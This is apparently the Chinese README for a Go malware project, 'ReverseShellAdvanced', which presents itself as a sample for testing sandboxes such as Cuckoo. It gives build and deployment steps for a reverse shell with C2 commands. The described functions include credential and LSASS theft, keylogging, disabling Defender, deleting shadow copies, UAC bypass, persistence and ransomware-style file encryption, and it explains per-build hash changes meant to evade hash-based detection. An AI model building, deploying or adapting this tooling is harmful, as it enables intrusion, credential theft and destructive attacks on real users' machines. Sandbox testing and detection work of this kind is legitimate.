# ReverseShellAdvanced

> ⚠️ **仅供安全研究和教育目的使用，请在隔离环境中测试**

这是一个用于测试沙箱检测能力的高级反向Shell恶意软件样本，包含多种典型恶意行为特征，可被 Cuckoo 等沙箱正确识别。

## 快速开始

```bash
# 1. 修改C2地址（可选，默认127.0.0.1:4444）
vim main.go

# 2. 编译
./build.sh

# 3. 在另一个终端启动监听
nc -lvnp 4444

# 4. 在Windows靶机上执行
./bin/reverse_shell_win64.exe
```

## ⚠️ 重要警告

**程序启动时会立即执行以下操作：**

- 禁用 Windows Defender 和其他安全软件
- 删除卷影副本（勒索软件特征）
- 清除 Windows 事件日志
- 建立持久化机制
- 启动键盘记录

**仅在隔离虚拟机中测试，不要在生产环境运行！**

### 恶意行为特征

| 类别 | 技术 | 触发的检测签名 |
|------|------|----------------|
| **进程注入** | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | injection_* |
| **Shellcode执行** | VirtualAlloc (RWX) + CreateThread | shellcode_* |
| **键盘记录** | GetAsyncKeyState 循环监控 | keylogger_* |
| **凭证窃取** | Chrome/Edge/Firefox 凭证、WiFi密码、LSASS dump | stealer_* |
| **安全软件禁用** | 停止 Defender、删除卷影副本、清除日志 | antiav_*, ransomware_* |
| **文件加密** | AES 加密 + 勒索信生成 | ransomware_* |
| **UAC绕过** | fodhelper / eventvwr 注册表劫持 | uac_bypass_* |
| **下载执行** | PowerShell IEX、certutil、bitsadmin | downloader_* |
| **网络侦察** | arp、netstat、net view /domain | recon_* |
| **持久化** | 注册表Run键、计划任务、启动文件夹 | persistence_* |

### 静态特征

程序中包含以下可被静态分析检测的恶意字符串：

- Mimikatz 相关命令（sekurlsa::logonpasswords、lsadump::sam）
- 攻击框架名称（Cobalt Strike、Empire、meterpreter）
- 恶意 PowerShell 模式（IEX、DownloadString、Invoke-Expression）
- 比特币地址

### 动态API调用

加载的敏感 Windows API：

```txt
kernel32.dll: VirtualAlloc, VirtualAllocEx, CreateThread, CreateRemoteThread, 
              OpenProcess, WriteProcessMemory, ReadProcessMemory
ntdll.dll:    NtCreateThreadEx, RtlCreateUserThread
user32.dll:   GetAsyncKeyState, GetForegroundWindow, GetWindowTextW
advapi32.dll: RegOpenKeyExW, RegSetValueExW
psapi.dll:    EnumProcesses, EnumProcessModules
```

## C2 命令

连接成功后支持以下命令：

| 命令 | 说明 |
|------|------|
| `sysinfo` | 收集系统信息 |
| `recon` | 网络侦察（ARP、路由、共享、域信息） |
| `creds` | 窃取凭证（浏览器、WiFi） |
| `persist` | 建立持久化 |
| `disableav` | 禁用安全软件 |
| `uacbypass` | 尝试 UAC 绕过 |
| `encrypt` | 加密用户文档（⚠️ 危险） |
| `inject` | 执行 shellcode |
| `exit` | 断开连接 |
| `<任意命令>` | 通过 cmd /C 执行 |

## 编译

### 环境要求

- Go 1.21+
- macOS / Linux / Windows

### 交叉编译（macOS → Windows）

#### 使用编译脚本（推荐）

```bash
./build.sh
```

编译脚本会自动：

- 生成随机 buildID（32位随机字符 + Unix时间戳）
- 注入到二进制文件中
- 每次编译生成不同的 MD5/SHA256 哈希

#### 或手动编译

```bash
# 不注入buildID的基础编译
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o bin/reverse_shell_win64.exe main.go
GOOS=windows GOARCH=386 go build -ldflags="-s -w -H windowsgui" -o bin/reverse_shell_win32.exe main.go

# 手动注入buildID
BUILD_ID=$(date +%s) && \
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui -X main.buildID=$BUILD_ID" -o bin/reverse_shell_win64.exe main.go
```

### 编译参数说明

| 参数 | 作用 |
|------|------|
| `GOOS=windows` | 目标系统 Windows |
| `GOARCH=amd64/386` | 64位/32位架构 |
| `-ldflags=...` | 链接时标志 |
| `-s -w` | 去除符号表和调试信息（减小体积） |
| `-H windowsgui` | 隐藏控制台窗口 |
| `-X main.buildID=<值>` | 在编译时注入buildID变量，使文件哈希变化 |

## 使用方法

### 1. 修改 C2 地址

编辑 `main.go` 中的常量：

```go
const (
    C2Server = "YOUR_IP:4444"
)
```

### 2. 编译

```bash
./build.sh
```

### 3. 启动监听

```bash
# 攻击机
nc -lvnp 4444
# 或
rlwrap nc -lvnp 4444
```

### 4. 在靶机执行

将 `bin/reverse_shell_win64.exe` 传输到 Windows 靶机执行。

## 测试工具

`test/main.go` 是一个无害的功能测试程序，用于验证：

- 命令执行功能
- Windows API 调用
- 注册表访问
- 文件操作
- PowerShell 执行

```bash
# 编译测试程序
GOOS=windows GOARCH=amd64 go build -o bin/test_win64.exe test/main.go
```

## 项目结构

```sh
ReverseShellAdvanced/
├── main.go          # 主程序（完整恶意功能）
│                    # 包含 var buildID 用于接收编译时注入的随机ID
├── go.mod           # Go 模块定义
├── build.sh         # 编译脚本
│                    # 自动生成随机buildID并注入到二进制文件
├── README.md        # 说明文档
├── test/
│   └── main.go      # 功能测试程序（无害）
└── bin/
    ├── reverse_shell_win64.exe  # 64位版本（每次MD5不同）
    ├── reverse_shell_win32.exe  # 32位版本（每次MD5不同）
    └── test_win64.exe           # 测试程序
```

## 靶机恢复

如果在真实环境测试，执行后需要清理：

```powershell
# 删除持久化
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f
schtasks /delete /tn WindowsUpdateTask /f
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"

# 删除临时文件
rd /s /q "%TEMP%\cache"
del "%TEMP%\keylog.txt"
del "%TEMP%\lsass.dmp"
del "%TEMP%\payload.exe"
del "%TEMP%\mimikatz.log"
del "%TEMP%\pwdump.txt"

# 重新启用 Defender
Set-MpPreference -DisableRealtimeMonitoring $false
sc config WinDefend start=auto
net start WinDefend
```

**建议**：在虚拟机中测试，测试前创建快照，测试后直接恢复快照。

### 虚拟机快照恢复（推荐方案）

```bash
# 使用 VirtualBox
VBoxManage snapshot "Win10VM" restore "BeforeMalware"

# 使用 VMware
vmrun revertSnapshot "Win10VM.vmx" "BeforeMalware"

# 使用 KVM/QEMU
virsh snapshot-revert Win10VM BeforeMalware
```

## MD5 变化机制

编译脚本通过以下方式确保每次编译生成的文件哈希不同：

1. 生成随机字符串（32位）
2. 获取当前 Unix 时间戳
3. 通过 `-X main.buildID=<随机值>_<时间戳>` 注入到二进制文件
4. buildID 作为全局变量被编译进程序，改变文件内容

效果示例：

```sh
[*] Build ID: m3xCzahAxUflkmy11SK81olupXu9JiPi_1768546228
[*] File hashes (MD5):
MD5 (./bin/reverse_shell_win64.exe) = 0e469888726fcf8925ab7b23cbc3c5d3

[*] Build ID: ud4zlyPphN1MGn4cpTeKSjG7FlEAdRA7_1768546238  
[*] File hashes (MD5):
MD5 (./bin/reverse_shell_win64.exe) = 451cfe4869f0230318029ea612dc3d68
```

这使得同一份源码可以生成无穷多个不同哈希的变种，规避基于哈希的检测。

## 检测结果

本样本可被以下安全产品检测：

- ✅ Cuckoo Sandbox（行为分析）
- ✅ Windows Defender（需开启实时保护）
- ✅ VirusTotal（多引擎检测）
- ✅ 静态分析工具（恶意字符串签名）

## 免责声明

本项目仅供以下用途：

- 安全研究和学习
- 沙箱检测能力测试
- 终端防护产品评估
- 恶意软件分析培训

**严禁用于任何非法目的。使用者需自行承担法律责任。**

## Cuckoo 沙箱测试

### 提交样本到 Cuckoo

```bash
# 使用 cuckoo 命令行工具
cuckoo submit bin/reverse_shell_win64.exe

# 或通过 Web 界面
# 访问 http://localhost:8090 上传
```

### 预期检测

Cuckoo 应该检测到以下行为：

- **进程树**: 检测到多个 cmd.exe、powershell.exe 的调用
- **注册表修改**: Run 键、计划任务修改
- **文件操作**: 写入 %TEMP%、%APPDATA% 目录
- **网络行为**: TCP 连接到 C2 地址
- **API 调用**: VirtualAlloc、CreateThread、WriteProcessMemory 等
- **字符串特征**: mimikatz、sekurlsa 等恶意IOC

### 分析结果示例

```json
{
  "score": 9.5,
  "signatures": [
    "creates_suspicious_files",
    "modifies_registry_run_key",
    "allocates_executable_memory",
    "injects_code",
    "connects_to_network",
    "credential_stealer",
    "disables_security_features",
    "keylogger_detected"
  ]
}
```

## 常见问题 (FAQ)

### Q: 程序启动后没有任何输出？

A: 这是正常的。程序使用了 `-H windowsgui` 编译参数隐藏了控制台窗口。如果需要调试，可以临时修改 `main.go` 移除此参数，或在命令行直接运行以查看输出。

### Q: 连接不到 C2 怎么办？

A:

1. 确认 C2 地址在 `main.go` 中正确配置
2. 确认监听服务已启动：`nc -lvnp 4444`
3. 确认网络连通性（可 ping 测试）
4. 检查防火墙是否阻止了连接

### Q: 如何禁用自动执行的恶意行为？

A: 目前程序启动时会自动执行，如需禁用，可编辑 `main.go` 中的 `main()` 函数注释掉相应的调用。

### Q: 程序可以在真实 Windows 系统上运行吗？

A: 可以，但会对系统造成实际破坏（禁用防护、删除卷影副本等）。强烈建议仅在虚拟机中测试。

### Q: 编译后的文件可以离线分析吗？

A: 可以。大多数静态分析工具可以检测到恶意字符串和 API 调用。VirusTotal 也可以进行分析。

### Q: 为什么每次编译 MD5 都不同？

A: 使用了编译时注入随机 buildID 的技术，使得每个编译产物都是独特的。这在真实场景中可以规避基于哈希的检测。

## 功能特性

## 参考资料

- [Cuckoo Sandbox](https://cuckoosandbox.org/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Windows API Index](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list)
